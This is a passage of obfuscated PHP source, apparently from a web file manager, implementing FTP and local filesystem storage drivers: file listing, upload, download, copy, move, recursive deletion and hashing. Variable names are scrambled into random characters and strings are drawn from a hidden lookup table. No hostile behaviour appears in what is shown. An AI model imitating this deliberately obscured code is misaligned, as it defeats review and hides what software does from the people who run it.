¿ßÜäú[76] => $this->getPathOuter($ ¿ßÜäú[8] . $¢˜ç¢Èà), $ ¿ßÜäú[29] => $ ¿ßÜäú[77]); if ($Ú˜ò·§) { return $ÍÌèõ‰; } $ÍÌèõ‰[$ ¿ßÜäú[194]] = $ÍÌèõ‰[$ ¿ßÜäú[84]] = 0; $ÍÌèõ‰[$ ¿ßÜäú[195]] = $ÍÌèõ‰[$ ¿ßÜäú[196]] = !0; return $ÍÌèõ‰; } private function fileInfo($Ñùï…«ï, $ÔœÀ¿‡ = false, $ö•ş„’‚ = array()) { $¾ÆƒŸ© =& $_SERVER[¥ÙÌÜ¾ê]; $¯Æ¤è¶® = array($¾ÆƒŸ©[28] => $this->pathThis($Ñùï…«ï), $¾ÆƒŸ©[76] => $this->getPathOuter($¾ÆƒŸ©[8] . $Ñùï…«ï), $¾ÆƒŸ©[29] => $¾ÆƒŸ©[193], $¾ÆƒŸ©[78] => isset($ö•ş„’‚[$¾ÆƒŸ©[78]]) ? $ö•ş„’‚[$¾ÆƒŸ©[78]] : 0, $¾ÆƒŸ©[168] => $this->ext($Ñùï…«ï)); if ($ÔœÀ¿‡) { return $¯Æ¤è¶®; } $¯Æ¤è¶®[$¾ÆƒŸ©[194]] = $¯Æ¤è¶®[$¾ÆƒŸ©[84]] = 0; $¯Æ¤è¶®[$¾ÆƒŸ©[195]] = $¯Æ¤è¶®[$¾ÆƒŸ©[196]] = !0; $€¡¤¥Ö = $this->iconvSystem($Ñùï…«ï); $¯Æ¤è¶®[$¾ÆƒŸ©[84]] = @ftp_mdtm($this->connect, $€¡¤¥Ö); if (empty($ö•ş„’‚)) { $ö•ş„’‚ = $this->objectMeta($Ñùï…«ï); if (!$ö•ş„’‚) { return $¯Æ¤è¶®; } } $¯Æ¤è¶®[$¾ÆƒŸ©[78]] = $ö•ş„’‚[$¾ÆƒŸ©[78]]; return $¯Æ¤è¶®; } public function size($‹ú§¼“) { $Æ‹ì˜üÉ = $this->objectMeta($‹ú§¼“); return $Æ‹ì˜üÉ ? $Æ‹ì˜üÉ[$_SERVER[¥ÙÌÜ¾ê][78]] : 0; } public function info($Æ™ç‘Û) { if ($this->isFile($Æ™ç‘Û)) { return $this->fileInfo($Æ™ç‘Û, 0); } else { if ($this->isFolder($Æ™ç‘Û)) { return $this->folderInfo($Æ™ç‘Û); } } return !1; } private function fileList($•¯Î¼†È, &$‡µ€“¡¼, &$Í¥ª»®, $£˜Üõ™Ş = false) { $áîë•¸ =& $_SERVER[¥ÙÌÜ¾ê]; $•¯Î¼†È = $this->iconvSystem($•¯Î¼†È); if (!$this->isFolder($•¯Î¼†È)) { return !1; } @ftp_chdir($this->connect, $áîë•¸[8]); $•¯Î¼†È = rtrim($•¯Î¼†È, $áîë•¸[8]) . $áîë•¸[8]; check_abort(); $æ§ØëÉ = $this->listItemCache === !1 ? !1 : !0; $§ëç‚§Ñ = @ftp_rawlist($this->connect, $•¯Î¼†È); if (!$§ëç‚§Ñ) { $§ëç‚§Ñ = array(); } $Úîˆø÷ç = array($áîë•¸[95] => 1, $áîë•¸[1300] => 1); foreach ($§ëç‚§Ñ as $Ùêöî±) { $…’…’•½ = $this->_listItem($Ùêöî±); if ($…’…’•½[0] == $áîë•¸[752]) { continue; } $•ÇÓÀÅø = $…’…’•½[8]; if (empty($•ÇÓÀÅø) && $•ÇÓÀÅø !== $áîë•¸[191] || isset($Úîˆø÷ç[$•ÇÓÀÅø])) { continue; } $•ÇÓÀÅø = $this->iconvApp($•¯Î¼†È . ltrim($•ÇÓÀÅø, $áîë•¸[8])); $­ÜİÌõ = array($áîë•¸[28] => $•ÇÓÀÅø, $áîë•¸[29] => $áîë•¸[193], $áîë•¸[78] => $…’…’•½[4]); if (substr($Ùêöî±, 0, 1) == $áîë•¸[1301]) { $­ÜİÌõ[$áîë•¸[29]] = $áîë•¸[77]; $­ÜİÌõ[$áîë•¸[78]] = 0; } $œ¯¾Ôµ¯ = $­ÜİÌõ[$áîë•¸[29]] == $áîë•¸[77] ? !0 : !1; if ($æ§ØëÉ) { $this->cacheMethod($áîë•¸[199], $•ÇÓÀÅø, $œ¯¾Ôµ¯); $this->cacheMethod($áîë•¸[200], $•ÇÓÀÅø, $­ÜİÌõ); } if ($œ¯¾Ôµ¯) { $‡µ€“¡¼[] = $•ÇÓÀÅø; if ($£˜Üõ™Ş) { $this->fileList($•ÇÓÀÅø, $‡µ€“¡¼, $Í¥ª»®, $£˜Üõ™Ş); } continue; } $Í¥ª»®[] = $­ÜİÌõ; } if ($æ§ØëÉ) { $this->cacheMethod($áîë•¸[199], $•¯Î¼†È, !0); } } private function _listItem($ƒåÕê¶…) { if (empty($ƒåÕê¶…)) { return array(); } $ÇĞç—ÙÉ = preg_split($_SERVER[¥ÙÌÜ¾ê][1302], $ƒåÕê¶…); if (count($ÇĞç—ÙÉ) <= 9) { return $ÇĞç—ÙÉ; } $ÇĞç—ÙÉ[8] = trim(substr($ƒåÕê¶…, strpos($ƒåÕê¶…, $ÇĞç—ÙÉ[7]) + strlen($ÇĞç—ÙÉ[7]))); return array_splice($ÇĞç—ÙÉ, 0, 9); } public function listPath($æåéæ…Ü, $µÊ«‡òÅ = false) { $¿ÎÇ‹ˆÙ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->_isconn()) { return !1; } $ª—ëşÊº = $Š“„™ë› = array(); $this->fileList($æåéæ…Ü, $ª—ëşÊº, $Š“„™ë›); foreach ($ª—ëşÊº as $§‘Ñãóß => $º›«ÀÄÅ) { $ª—ëşÊº[$§‘Ñãóß] = $this->folderInfo($º›«ÀÄÅ, $µÊ«‡òÅ); } foreach ($Š“„™ë› as $§‘Ñãóß => $º›«ÀÄÅ) { $Š“„™ë›[$§‘Ñãóß] = $this->fileInfo($º›«ÀÄÅ[$¿ÎÇ‹ˆÙ[28]], $µÊ«‡òÅ, $º›«ÀÄÅ); } return array($¿ÎÇ‹ˆÙ[75] => $ª—ëşÊº, $¿ÎÇ‹ˆÙ[74] => $Š“„™ë›); } public function has($ˆ­ò™ôÙ, $Ãø¢Õ¬ = false, $Æ…Ğ‘ß± = true) { $»¼ÚÉ²í =& $_SERVER[¥ÙÌÜ¾ê]; $ ùÑµÁ• = $´âÓˆÄñ = array(); $ê¤Æõ´İ = $Ãø¢Õ¬ ? !0 : !1; $this->fileList($ˆ­ò™ôÙ, $ ùÑµÁ•, $´âÓˆÄñ, $ê¤Æõ´İ); if ($Ãø¢Õ¬) { return array($»¼ÚÉ²í[203] => count($´âÓˆÄñ), $»¼ÚÉ²í[204] => count($ ùÑµÁ•)); } if ($Æ…Ğ‘ß±) { if (count($´âÓˆÄñ)) { return !0; } } else { if (count($ ùÑµÁ•)) { return !0; } } return !1; } public function listAll($ã—¤‡ÑÏ) { $ÙÇ“üŞâ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->_isconn()) { return !1; } $Œö¦Èåæ = $±ÚõµŒ = array(); $this->fileList($ã—¤‡ÑÏ, $Œö¦Èåæ, $±ÚõµŒ, !0); $’£çíøö = array(); foreach ($±ÚõµŒ as $Ä¤”šŸ‹) { $’£çíøö[$Ä¤”šŸ‹[$ÙÇ“üŞâ[28]]] = $Ä¤”šŸ‹[$ÙÇ“üŞâ[78]]; } foreach ($Œö¦Èåæ as $Ä¤”šŸ‹) { if (is_string($Ä¤”šŸ‹)) { $’£çíøö[$Ä¤”šŸ‹] = 0; } } return $this->listAllFiles($ã—¤‡ÑÏ, array_keys($’£çíøö), $’£çíøö); } public function getContent($úıĞõÌ˜) { if (!$this->_isconn()) { return !1; } $úıĞõÌ˜ = $this->iconvSystem($úıĞõÌ˜); return $this->fileSubstr($úıĞõÌ˜); } public function setContent($õ¹ñÑ¤„, $±¾·à€¡ = '') { if (!$this->_isconn()) { return !1; } $¼Ú»íø = $this->pathThis($this->iconvSystem($õ¹ñÑ¤„)); $ÍÍËæª = $this->tempFile($¼Ú»íø); file_put_contents($ÍÍËæª, $±¾·à€¡); $Á¶Üæ¥ø = $this->upload($õ¹ñÑ¤„, $this->iconvApp($ÍÍËæª)); $this->tempFileRemve($ÍÍËæª); return $Á¶Üæ¥ø; } public function fileSubstr($ğªÎó¿ó, $•ÖÊ‘‚š = 0, $íàû©ë = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ğªÎó¿ó, $•ÖÊ‘‚š, $íàû©ë); } private function ftpRequest($¡›¿„€ì, $æŒ¼•‰¦ = 0, $‘Î®àƒ = false) { $¡›¿„€ì = $this->iconvSystem($¡›¿„€ì); $®¤Šå¡ß = $this->scheme . $this->host . $_SERVER[¥ÙÌÜ¾ê][4] . $this->port; $­–ĞÎğ = curl_init(); curl_setopt($­–ĞÎğ, CURLOPT_URL, $®¤Šå¡ß . $this->pathEncode($¡›¿„€ì)); curl_setopt($­–ĞÎğ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($‘Î®àƒ) { $Ø¬ëõå = $æŒ¼•‰¦ + $‘Î®àƒ - 1; curl_setopt($­–ĞÎğ, CURLOPT_RANGE, "{$æŒ¼•‰¦}\55{$Ø¬ëõå}"); } curl_setopt($­–ĞÎğ, CURLOPT_RETURNTRANSFER, 1); $ß¤Â¤Œ‘ = curl_exec($­–ĞÎğ); curl_close($­–ĞÎğ); return $ß¤Â¤Œ‘; } public function upload($ƒ¿¤–Ú¡, $íéˆ–¸, $ËÁ”Áò  = false, $›äÖšˆí = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ƒ¿¤–Ú¡))) { return !1; } $ƒ¿¤–Ú¡ = $this->iconvSystem($ƒ¿¤–Ú¡); $íéˆ–¸ = $this->iconvSystem($íéˆ–¸); $Éİêİó› = ftp_nb_put($this->connect, $ƒ¿¤–Ú¡, $íéˆ–¸, FTP_BINARY); while ($Éİêİó› == FTP_MOREDATA) { $Éİêİó› = ftp_nb_continue($this->connect); } if ($Éİêİó› != FTP_FINISHED) { return !1; } return $this->getPathOuter($ƒ¿¤–Ú¡); } public function download($Ì…Û±³¸, $¢ş‰Êèè = '') { if (!$this->_isconn()) { return !1; } $§‰ıùà» = $this->pathFather($¢ş‰Êèè); if (!IO::mkdir($§‰ıùà»)) { return !1; } $Ì…Û±³¸ = $this->iconvSystem($Ì…Û±³¸); $¢ş‰Êèè = $this->iconvSystem($¢ş‰Êèè); $¿çŞ«ÊŞ = ftp_nb_get($this->connect, $¢ş‰Êèè, $Ì…Û±³¸, FTP_BINARY); while ($¿çŞ«ÊŞ == FTP_MOREDATA) { $¿çŞ«ÊŞ = ftp_nb_continue($this->connect); } if ($¿çŞ«ÊŞ != FTP_FINISHED) { return !1; } return $this->iconvApp($¢ş‰Êèè); } public function exist($íìÚÕ¡) { return $this->isFile($íìÚÕ¡) || $this->isFolder($íìÚÕ¡); } public function isFile($¢¬à¯÷ƒ) { return !$this->isFolder($¢¬à¯÷ƒ) && $this->objectMeta($¢¬à¯÷ƒ); } public function isFolder($ëñŠÖÓ³) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][199], $ëñŠÖÓ³); } protected function objectMeta($‰†™ÙÀı) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][200], $‰†™ÙÀı); } protected function _objectMeta($Ğ‘†¤İ«) { $à¬°‹À =& $_SERVER[¥ÙÌÜ¾ê]; if ($Ğ‘†¤İ« == $à¬°‹À[33] || $Ğ‘†¤İ« == $à¬°‹À[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ğ‘†¤İ« = $this->iconvSystem($Ğ‘†¤İ«); $«æÏ›‰Ş = array($à¬°‹À[28] => $this->iconvApp($Ğ‘†¤İ«), $à¬°‹À[29] => $à¬°‹À[193], $à¬°‹À[78] => 0); @ftp_chdir($this->connect, $à¬°‹À[8]); $ Õ¡Ä«” = @ftp_size($this->connect, $Ğ‘†¤İ«); if ($ Õ¡Ä«” != -1) { $«æÏ›‰Ş[$à¬°‹À[78]] = $ Õ¡Ä«”; } else { $µ§–ôª– = @ftp_chdir($this->connect, $Ğ‘†¤İ«); if (!$µ§–ôª–) { return !1; } $«æÏ›‰Ş[$à¬°‹À[29]] = $à¬°‹À[77]; } return $«æÏ›‰Ş; } protected function _isFolder($öô§Ã¬) { $á¨§Á¢å =& $_SERVER[¥ÙÌÜ¾ê]; if ($öô§Ã¬ == $á¨§Á¢å[33] || $öô§Ã¬ == $á¨§Á¢å[8]) { return !0; } $±æà™ÌÉ = $this->_objectMeta($öô§Ã¬); return isset($±æà™ÌÉ[$á¨§Á¢å[29]]) && $±æà™ÌÉ[$á¨§Á¢å[29]] == $á¨§Á¢å[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($…àü‰…») { if (substr($…àü‰…», 0, 2) == $_SERVER[¥ÙÌÜ¾ê][1293]) { $…àü‰…» = BASIC_PATH . substr($…àü‰…», 2); } return $…àü‰…»; } public function iconvApp($ØŒÃ§Ò) { $šçú”ƒ =& $_SERVER[¥ÙÌÜ¾ê]; global $config; return $this->iconvTo($ØŒÃ§Ò, $config[$šçú”ƒ[1291]], $config[$šçú”ƒ[1290]]); } public function iconvSystem($€©§ñ…’) { $¹ƒ’ìáğ =& $_SERVER[¥ÙÌÜ¾ê]; global $config; return $this->iconvTo($€©§ñ…’, $config[$¹ƒ’ìáğ[1290]], $config[$¹ƒ’ìáğ[1291]]); } public function getPathOuter($Ùû°¨šç) { $Òí¦¡êı =& $_SERVER[¥ÙÌÜ¾ê]; $îË™…¥ó = $this->iconvApp($this->pathBase); $Ùû°¨šç = $this->iconvApp($Ùû°¨šç); if (substr($îË™…¥ó, 0, 2) == $Òí¦¡êı[1293]) { $îË™…¥ó = BASIC_PATH . substr($îË™…¥ó, 2); } if (substr($Ùû°¨šç, 0, 2) == $Òí¦¡êı[1293]) { $Ùû°¨šç = BASIC_PATH . substr($Ùû°¨šç, 2); } $îË™…¥ó = KodIO::clear($îË™…¥ó); $Ùû°¨šç = KodIO::clear($Ùû°¨šç); $Ùû°¨šç = substr($Ùû°¨šç, strlen($îË™…¥ó)); if (empty($this->pathDriver)) { return $Ùû°¨šç; } return $this->pathDriver . $Òí¦¡êı[8] . ltrim($Ùû°¨šç, $Òí¦¡êı[8]); } public function mkfile($Î™çÕÔ¢, $Ù…Á„ñ— = '', $úïºá¼­ = REPEAT_RENAME) { $Î™çÕÔ¢ = $this->iconvSystem($Î™çÕÔ¢); @touch($Î™çÕÔ¢); if ($Ù…Á„ñ—) { file_put_contents($Î™çÕÔ¢, $Ù…Á„ñ—); } @chmod($Î™çÕÔ¢, $this->pathAuth); return is_file($Î™çÕÔ¢) ? $this->getPathOuter($Î™çÕÔ¢) : !1; } public function mkdir($ıŸ™¤°, $Åğ¤”¬œ = REPEAT_SKIP) { $ıŸ™¤° = $this->iconvSystem($ıŸ™¤°); if (is_dir($ıŸ™¤°)) { return $this->getPathOuter($ıŸ™¤°); } @mkdir($ıŸ™¤°, $this->pathAuth, !0); @chmod($ıŸ™¤°, $this->pathAuth); return is_dir($ıŸ™¤°) ? $this->getPathOuter($ıŸ™¤°) : !1; } public function copyFile($†™¿¡Åò, $Ì“Ù—ää) { $this->mkdir($this->pathFather($Ì“Ù—ää)); $†™¿¡Åò = $this->iconvSystem($†™¿¡Åò); $Ì“Ù—ää = $this->iconvSystem($Ì“Ù—ää); $Æ”‚‡Ú“ = copy_64($†™¿¡Åò, $Ì“Ù—ää); @chmod($Ì“Ù—ää, $this->pathAuth); return $Æ”‚‡Ú“ ? $this->getPathOuter($Ì“Ù—ää) : !1; } public function moveFile($¯ˆñóå, $«¡ıšªÏ) { $this->mkdir($this->pathFather($«¡ıšªÏ)); $¯ˆñóå = $this->iconvSystem($¯ˆñóå); $«¡ıšªÏ = $this->iconvSystem($«¡ıšªÏ); $Ã¡ªşå = intval(@rename($¯ˆñóå, $«¡ıšªÏ)); if (!$Ã¡ªşå) { if ($Ã¡ªşå = intval(@copy_64($¯ˆñóå, $«¡ıšªÏ))) { @unlink($¯ˆñóå); } } @chmod($«¡ıšªÏ, $this->pathAuth); return $Ã¡ªşå ? $this->getPathOuter($«¡ıšªÏ) : !1; } public function movePath($à¹®Íš›, $Ì¦œƒœä, $Êæ…ô¾Æ = false) { $ñæÍ§«¥ =& $_SERVER[¥ÙÌÜ¾ê]; $à¹®Íš› = $this->iconvSystem($à¹®Íš›); $Ì¦œƒœä = $this->iconvSystem($Ì¦œƒœä); $¯ÔàÖ•Ö = rtrim($Ì¦œƒœä, $ñæÍ§«¥[8]) . $ñæÍ§«¥[8] . ($Êæ…ô¾Æ ? $Êæ…ô¾Æ : get_path_this($à¹®Íš›)); if (file_exists($¯ÔàÖ•Ö)) { return !1; } $ïáñË…Ñ = intval(@rename($à¹®Íš›, $¯ÔàÖ•Ö)); $ïáñË…Ñ = file_exists($¯ÔàÖ•Ö); return $ïáñË…Ñ ? $this->getPathOuter($¯ÔàÖ•Ö) : !1; } public function delFile($¼ã‹¿…Á) { $¼ã‹¿…Á = $this->iconvSystem($¼ã‹¿…Á); if (!@unlink($¼ã‹¿…Á)) { @chmod($¼ã‹¿…Á, $this->pathAuth); if (!@unlink($¼ã‹¿…Á)) { return !1; } } else { return !0; } } public function delFolder($†™É¡—†) { $âª­¢¬Ÿ =& $_SERVER[¥ÙÌÜ¾ê]; $†™É¡—† = $this->iconvSystem($†™É¡—†); if (!is_dir($†™É¡—†)) { return !0; } if (!($…ô‚âç = opendir($†™É¡—†))) { return !1; } while (($÷¢÷Ïïó = readdir($…ô‚âç)) !== !1) { if ($÷¢÷Ïïó == $âª­¢¬Ÿ[95] || $÷¢÷Ïïó == $âª­¢¬Ÿ[1300]) { continue; } $Ğ¤Üş—Ğ = $†™É¡—† . $âª­¢¬Ÿ[8] . $÷¢÷Ïïó; if (is_file($Ğ¤Üş—Ğ) || is_link($Ğ¤Üş—Ğ)) { if (!unlink($Ğ¤Üş—Ğ)) { chmod($Ğ¤Üş—Ğ, $this->pathAuth); if (!unlink($Ğ¤Üş—Ğ)) { return !1; } } } else { if (is_dir($Ğ¤Üş—Ğ)) { chmod($Ğ¤Üş—Ğ, $this->pathAuth); $Ğ¤Üş—Ğ = $this->iconvApp($Ğ¤Üş—Ğ); if (!$this->delFolder($Ğ¤Üş—Ğ)) { return !1; } } } } closedir($…ô‚âç); return rmdir($†™É¡—†); } public function rename($ê§‰ÂšÒ, $ò÷—¸íÛ) { $ëÙøüì´ =& $_SERVER[¥ÙÌÜ¾ê]; $Ûˆ”–Ô = $this->fileNameAuto($this->pathFather($ê§‰ÂšÒ), $ò÷—¸íÛ); $Ûˆ”–Ô = $this->iconvSystem($Ûˆ”–Ô); $ê§‰ÂšÒ = $this->iconvSystem($ê§‰ÂšÒ); $Ç»ĞØÙ¦ = $this->pathFather($ê§‰ÂšÒ); $Š¦ñ×ì = rtrim($Ç»ĞØÙ¦, $ëÙøüì´[8]) . $ëÙøüì´[8] . $Ûˆ”–Ô; $şËµŠàû = @rename($ê§‰ÂšÒ, $Š¦ñ×ì); $Š¦ñ×ì = $this->iconvApp($Š¦ñ×ì); return $şËµŠàû ? $this->getPathOuter($Š¦ñ×ì) : !1; } public function size($·şíÀŞ) { $·şíÀŞ = $this->iconvSystem($·şíÀŞ); return filesize_64($·şíÀŞ); } public function info($îè€¾‚») { $îè€¾‚» = $this->iconvSystem($îè€¾‚»); if ($this->isFolder($îè€¾‚»)) { return $this->folderInfo($îè€¾‚»); } else { if ($this->isFile($îè€¾‚»)) { return $this->fileInfo($îè€¾‚»); } } return !1; } protected function infoChildren($İí…°‰ş, &$¼¿¥ûƒÌ, $«åÅ«†¦ = true) { $äîû‚ñ =& $_SERVER[¥ÙÌÜ¾ê]; check_abort_echo(); $İí…°‰ş = rtrim($İí…°‰ş, $äîû‚ñ[8]) . $äîû‚ñ[8]; if ($«åÅ«†¦) { $İí…°‰ş = $this->iconvSystem($İí…°‰ş); } if (!($³¿´¢¿ = @opendir($İí…°‰ş))) { return; } while (($ÅÇ´ôêÁ = readdir($³¿´¢¿)) !== !1) { if ($ÅÇ´ôêÁ == $äîû‚ñ[95] || $ÅÇ´ôêÁ == $äîû‚ñ[1300]) { continue; } $ÃæµµØÑ = $İí…°‰ş . $ÅÇ´ôêÁ; if (is_file($ÃæµµØÑ) || is_link($ÃæµµØÑ)) { $¼¿¥ûƒÌ[$äîû‚ñ[79]]++; $¼¿¥ûƒÌ[$äîû‚ñ[78]] += filesize_64($ÃæµµØÑ); } else { if (is_dir($ÃæµµØÑ)) { $¼¿¥ûƒÌ[$äîû‚ñ[80]]++; $this->infoChildren($ÃæµµØÑ, $¼¿¥ûƒÌ, !1); } } } closedir($³¿´¢¿); } private function folderInfo($’Çğùç, $°Ş…±û€ = false) { $½ÚØÁ· =& $_SERVER[¥ÙÌÜ¾ê]; $’Çğùç = rtrim($’Çğùç, $½ÚØÁ·[8]) . $½ÚØÁ·[8]; $¿Ä®¥® = $this->iconvApp($this->pathThis($’Çğùç)); if ($°Ş…±û€) { return array($½ÚØÁ·[28] => $¿Ä®¥®, $½ÚØÁ·[76] => $this->getPathOuter($’Çğùç), $½ÚØÁ·[29] => $½ÚØÁ·[77]); } $ö‡ƒÖˆ = array($½ÚØÁ·[28] => $¿Ä®¥®, $½ÚØÁ·[76] => $this->getPathOuter($’Çğùç), $½ÚØÁ·[29] => $½ÚØÁ·[77], $½ÚØÁ·[194] => @filectime($’Çğùç), $½ÚØÁ·[84] => @filemtime($’Çğùç), $½ÚØÁ·[1303] => @fileatime($’Çğùç), $½ÚØÁ·[1304] => is_readable($’Çğùç), $½ÚØÁ·[1305] => is_writable($’Çğùç), $½ÚØÁ·[1306] => get_mode($’Çğùç)); return $ö‡ƒÖˆ; } private function fileInfo($›ğÇı, $‡·îİµ = false) { $ÍÄÁıò =& $_SERVER[¥ÙÌÜ¾ê]; $ÌÅï‡ƒÖ = $this->iconvApp($this->pathThis($›ğÇı)); if ($‡·îİµ) { return array($ÍÄÁıò[28] => $ÌÅï‡ƒÖ, $ÍÄÁıò[76] => $this->getPathOuter($›ğÇı), $ÍÄÁıò[29] => $ÍÄÁıò[193], $ÍÄÁıò[78] => $this->size($›ğÇı), $ÍÄÁıò[168] => $this->ext($ÌÅï‡ƒÖ)); } $—ùî¶¼… = array($ÍÄÁıò[28] => $ÌÅï‡ƒÖ, $ÍÄÁıò[76] => $this->getPathOuter($›ğÇı), $ÍÄÁıò[29] => $ÍÄÁıò[193], $ÍÄÁıò[194] => @filectime($›ğÇı), $ÍÄÁıò[84] => @filemtime($›ğÇı), $ÍÄÁıò[1303] => @fileatime($›ğÇı), $ÍÄÁıò[78] => $this->size($›ğÇı), $ÍÄÁıò[168] => $this->ext($ÌÅï‡ƒÖ), $ÍÄÁıò[1304] => is_readable($›ğÇı), $ÍÄÁıò[1305] => is_writable($›ğÇı), $ÍÄÁıò[1306] => get_mode($›ğÇı)); return $—ùî¶¼…; } public function exist($¦Á ÁšÇ) { $¦Á ÁšÇ = $this->iconvSystem($¦Á ÁšÇ); return @file_exists($¦Á ÁšÇ); } public function isFile($¥Ã˜›Û) { $¥Ã˜›Û = $this->iconvSystem($¥Ã˜›Û); return @is_file($¥Ã˜›Û); } public function isFolder($Êã­Àé) { $Êã­Àé = $this->iconvSystem($Êã­Àé); return @is_dir($Êã­Àé); } public function listPath($Ó¢ó˜ÓŸ, $¥·¡Şø = false) { $£î‹³ü =& $_SERVER[¥ÙÌÜ¾ê]; $Ó¢ó˜ÓŸ = $this->iconvSystem($Ó¢ó˜ÓŸ); $Ó¢ó˜ÓŸ = rtrim($Ó¢ó˜ÓŸ, $£î‹³ü[8]) . $£î‹³ü[8]; $Œªï¢ = array($£î‹³ü[75] => array(), $£î‹³ü[74] => array()); if (!($è×İ¢“ = @opendir($Ó¢ó˜ÓŸ))) { return $Œªï¢; } while (($ö•øÎêù = readdir($è×İ¢“)) !== !1) { if ($ö•øÎêù == $£î‹³ü[95] || $ö•øÎêù == $£î‹³ü[1300]) { continue; } $êí»•Ú¤ = $Ó¢ó˜ÓŸ . $ö•øÎêù; if (is_file($êí»•Ú¤)) { $Œªï¢[$£î‹³ü[74]][] = $this->fileInfo($êí»•Ú¤, $¥·¡Şø); } else { $Œªï¢[$£î‹³ü[75]][] = $this->folderInfo($êí»•Ú¤, $¥·¡Şø); } } closedir($è×İ¢“); return $Œªï¢; } public function listAll($‚©Ü­Ç, &$¢ã»ĞæÊ = array()) { $¹ĞúÀĞ‚ =& $_SERVER[¥ÙÌÜ¾ê]; $‚©Ü­Ç = $this->iconvSystem($‚©Ü­Ç); $‚©Ü­Ç = rtrim($‚©Ü­Ç, $¹ĞúÀĞ‚[8]) . $¹ĞúÀĞ‚[8]; if (!($ÙïşôÇ¹ = @opendir($‚©Ü­Ç))) { return $¢ã»ĞæÊ; } while (($à¹­„÷ = readdir($ÙïşôÇ¹)) !== !1) { if ($à¹­„÷ == $¹ĞúÀĞ‚[95] || $à¹­„÷ == $¹ĞúÀĞ‚[1300]) { continue; } $üÄ´ò×¸ = $‚©Ü­Ç . $à¹­„÷; if (is_dir($üÄ´ò×¸) && !is_link($üÄ´ò×¸)) { $¢ã»ĞæÊ[] = array($¹ĞúÀĞ‚[76] => $üÄ´ò×¸ . $¹ĞúÀĞ‚[8], $¹ĞúÀĞ‚[77] => 1, $¹ĞúÀĞ‚[84] => @filemtime($üÄ´ò×¸), $¹ĞúÀĞ‚[78] => 0); $this->listAll($üÄ´ò×¸, $¢ã»ĞæÊ); } else { $¢ã»ĞæÊ[] = array($¹ĞúÀĞ‚[76] => $üÄ´ò×¸, $¹ĞúÀĞ‚[77] => 0, $¹ĞúÀĞ‚[84] => @filemtime($üÄ´ò×¸), $¹ĞúÀĞ‚[78] => $this->size($üÄ´ò×¸)); } } closedir($ÙïşôÇ¹); return $¢ã»ĞæÊ; } public function has($Ü›£óºñ, $ÜŒåáôÄ = false, $É¯è¤Ğ¢ = true) { $–Èğ™ÛÌ =& $_SERVER[¥ÙÌÜ¾ê]; $Ü›£óºñ = $this->iconvSystem($Ü›£óºñ); $Ü›£óºñ = rtrim($Ü›£óºñ, $–Èğ™ÛÌ[8]) . $–Èğ™ÛÌ[8]; if (!($™ã†Ù’½ = @opendir($Ü›£óºñ))) { return !1; } $‘…¿›Ö = 0; $ÍêƒóïÏ = 0; $õ¥ñÛ² = 0; while (($ı„Œ”èŒ = readdir($™ã†Ù’½)) !== !1) { if ($ı„Œ”èŒ == $–Èğ™ÛÌ[95] || $ı„Œ”èŒ == $–Èğ™ÛÌ[1300]) { continue; } $È»£¢†‚ = $Ü›£óºñ . $ı„Œ”èŒ; if ($ÜŒåáôÄ) { $õ¥ñÛ²++; if (@is_file($È»£¢†‚)) { $‘…¿›Ö++; } else { $ÍêƒóïÏ++; } if ($õ¥ñÛ² > 10000) { break; } continue; } if ($É¯è¤Ğ¢) { if (@is_file($È»£¢†‚)) { return !0; } } else { if (@is_dir($È»£¢†‚ . $–Èğ™ÛÌ[8])) { return !0; } } } closedir($™ã†Ù’½); if ($ÜŒåáôÄ) { return array($–Èğ™ÛÌ[203] => $‘…¿›Ö, $–Èğ™ÛÌ[204] => $ÍêƒóïÏ); } return !1; } public function hashSimple($­ÃüµëÖ) { $Åñ­âåÍ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$­ÃüµëÖ) { return md5($Åñ­âåÍ[33]); } $­ÃüµëÖ = $this->iconvSystem($­ÃüµëÖ); $…ÍéçûŠ = $this->size($­ÃüµëÖ); $¾Ùåôã = 200; $ö°¸ŒãÉ = 50; if ($…ÍéçûŠ <= $¾Ùåôã * $ö°¸ŒãÉ) { return $this->hashMd5($­ÃüµëÖ) . $…ÍéçûŠ; } $¹É‚Áàü = $Åñ­âåÍ[33]; $‘òÀ¯„« = intval($…ÍéçûŠ / $ö°¸ŒãÉ); $˜Ş‡â¤³ = fopen($­ÃüµëÖ, $Åñ­âåÍ[1307]); if (!$˜Ş‡â¤³) { return $¹É‚Áàü; } for ($Ê¡Ù›îé = 0; $Ê¡Ù›îé < $ö°¸ŒãÉ; $Ê¡Ù›îé++) { fseek_64($˜Ş‡â¤³, $‘òÀ¯„« * $Ê¡Ù›îé); $¹É‚Áàü .= fread($˜Ş‡â¤³, $¾Ùåôã); } fseek_64($˜Ş‡â¤³, $…ÍéçûŠ - $¾Ùåôã); $¹É‚Áàü .= fread($˜Ş‡â¤³, $¾Ùåôã); fclose($˜Ş‡â¤³); return md5($¹É‚Áàü) . $…ÍéçûŠ; } public function getContent($ÂëÇÁÔÕ) { $ÂëÇÁÔÕ = $this->iconvSystem($ÂëÇÁÔÕ); return file_get_contents($ÂëÇÁÔÕ); } public function setContent($ÏêÕ¹“æ, $Ú¶õ·ğ† = '') { $ÏêÕ¹“æ = $this->iconvSystem($ÏêÕ¹“æ); $û×İŠ´ø = @file_put_contents($ÏêÕ¹“æ, $Ú¶õ·ğ†, LOCK_EX); clearstatcache(); @chmod($ÏêÕ¹“æ, $this->pathAuth); return $û×İŠ´ø === !1 ? !1 : !0; } public function fileSubstr($ÄØ…ÏËÁ, $ËÊû÷§á = 0, $È‘Í¥Ø = false) { $ÔÁíÎ =& $_SERVER[¥ÙÌÜ¾ê]; $ÄØ…ÏËÁ = $this->iconvSystem($ÄØ…ÏËÁ); if ($È‘Í¥Ø === !1) { $È‘Í¥Ø = $this->size($ÄØ…ÏËÁ); } if ($È‘Í¥Ø <= 0) { return $ÔÁíÎ[33]; } $¯’ºüÕ = fopen($ÄØ…ÏËÁ, $ÔÁíÎ[1307]); if (!$¯’ºüÕ) { return !1; } fseek_64($¯’ºüÕ, 